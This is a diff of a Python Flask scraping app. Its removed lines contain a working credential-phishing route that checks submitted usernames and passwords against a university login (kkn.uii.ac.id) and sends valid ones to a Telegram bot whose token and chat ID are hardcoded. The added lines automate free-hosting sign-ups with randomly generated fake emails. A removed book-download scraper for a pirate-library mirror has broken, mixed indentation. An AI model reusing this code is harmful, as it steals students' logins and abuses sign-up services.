@@ -2,9 +2,8 @@ from flask import Flask, request, render_template, make_response
 import requests as req
 from bs4 import BeautifulSoup as  bs
 import json
-import urllib.request
-import ftplib
-
+import random
+import string
 
 app = Flask(__name__)
 
@@ -12,37 +11,45 @@ app = Flask(__name__)
 def home():
     return render_template('index.html')
 
-@app.route('/akses', methods=['GET', 'POST'])
+@app.route('/freecpanel', methods=['GET', 'POST'])
 def asu():
     return render_template('asu.html')
 
-@app.route('/akses/self', methods=['GET', 'POST'])
+@app.route('/freecpanel/self', methods=['GET', 'POST'])
 def run():
     if request.method == 'POST':
-        x = request.form['nama']
-        y = request.form['pass']
-        return umsida(x, y)
+        x = request.form['dom']
+        return create(x)
 
-
-def umsida(usr, pwd):
-    url = 'https://kkn.uii.ac.id/login.php'
-    x = {
-        "u":usr,
-        "p":pwd,
-        "submit":"submit"
+def create(domain):
+    url = 'https://www.freewebhostingarea.com/cgi-bin/create_account.cgi'
+    data = {
+        'thirdLevelDomain':domain,
+        'domain':'freetzi.com',
+        'action':'check_domain',
+    }
+    rdom = req.post(url, data=data).text
+    bisa = bs(rdom, 'html.parser').find('form')['action']
+    if bisa == 'https://newserv.freewha.com/cgi-bin/create_ini.cgi':
+        letters = string.ascii_lowercase
+        mail = ''.join(random.choice(letters) for i in range(10))
+        email = mail+'@gmail.com'
+        passw = ''.join(random.choice(letters) for i in range(11))
+        dom = domain+'.freetzi.com'
+        url = 'https://newserv.freewha.com/cgi-bin/create_ini.cgi'
+        #tok = b(r.get(url).text, 'html.parser').findAll('input')[1]['value']
+        dat = {
+            'action':'validate',
+            'domainName':dom,
+            'email':email,
+            'password':passw,
+            'confirmPassword':passw,
+            'agree':'1',
         }
-    post = req.post(url, data=x).url
-    if post.find('KKN-Status-Pendaftaran') != -1:
-        msg = "username: "+usr+"\npassword: "+pwd+"\n"
-        TOKEN = '2011172773:AAG-23HV-MX8Wn0anI5Bm9fuoQC4pJVwy7U'
-        CHAT_ID = '1884067981'
-        urls = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}'
-        ntz = req.post(urls)
-        return 'Login sukses'
+        rdat = req.post(url, data=dat).text
+        return render_template('result.html', dom=dom, pw=passw)
     else:
-        return 'Login gagal'
-        
-    
+        return 'ada yang salahhhhhh.....'
         
 
 @app.route('/api/filmapik/new_movie')
@@ -212,53 +219,6 @@ def covid():
     cvd.headers['Content-Type'] = 'application/json; charset=utf-8'
     cvd.headers['mimetype'] = 'application/json'
     return cvd
-
-@app.route('/api/lib', methods=['GET', 'POST'])
-def lib():
-    nama_lib = request.args['query']
-    return perpus(nama_lib)
-
-def perpus(keyword):
-    url = "https://id1lib.org/s/"
-    raw = urllib.request.urlopen(url+keyword)
-    source_code = raw.read()
-	res = bs(source_code, 'html.parser').find('div', {'id':'searchResultBox'}).findAll('div',{'class':'resItemBox'})
-	for i in res:
-	    a = i.find('table')
-	    c = a.find_all('tr')
-	    for tr in c:
-	        td = tr.find_all('td')
-	        td1 = td[0]
-	        z = td1.findAll('div',{'class':'itemCoverWrapper'})
-	        for it in range(len(z)):
-	            item = z[it]
-	            thub = item.find('img')['data-src']
-	            link = item.find('a')['href']
-	    raw2 = urllib.request.urlopen('https://id1lib.org'+link)
-	    source_code2 = raw2.read()
-	    res2 = bs(source_code2, 'html.parser')
-	    judul = res2.find('div', {'class':'cardBooks'}).find('h1').text
-	    gambar = res2.find('div', {'class':'cardBooks'}).find('img')['src']
-	    size = res2.find('div', {'class':'cardBooks'}).find('div', {'class':'bookDetailsBox'}).find('div', {'class':'property__file'}).find('div', {'class':'property_value'}).text
-	    bahasa = res2.find('div', {'class':'cardBooks'}).find('div', {'class':'bookDetailsBox'}).find('div', {'class':'property_language'}).find('div', {'class':'property_value'}).text
-	    download = res2.find('div', {'class':'details-buttons-container'}).findAll('div', {'class':'book-details-button'})[0].find('div', {'class':'btn-group'}).find('a')['href']
-	    title = judul.replace('                ','')
-        data = {
-            "status":200,
-            "creator":"sanzking",
-            "result":{
-                "judul":title,
-                "bahasa":bahasa,
-                "ukuran":size,
-                "cover":gambar,
-                "download":"https://id1lib.org"+download
-            }
-        }
-        b = json.dumps(data, indent=4)
-        response = make_response(b)
-        response.headers['Content-Type'] = 'application/json; charset=utf-8'
-        response.headers['mimetype'] = 'application/json'
-        return response
     
 if __name__ == '__main__':
     app.run(debug=True)
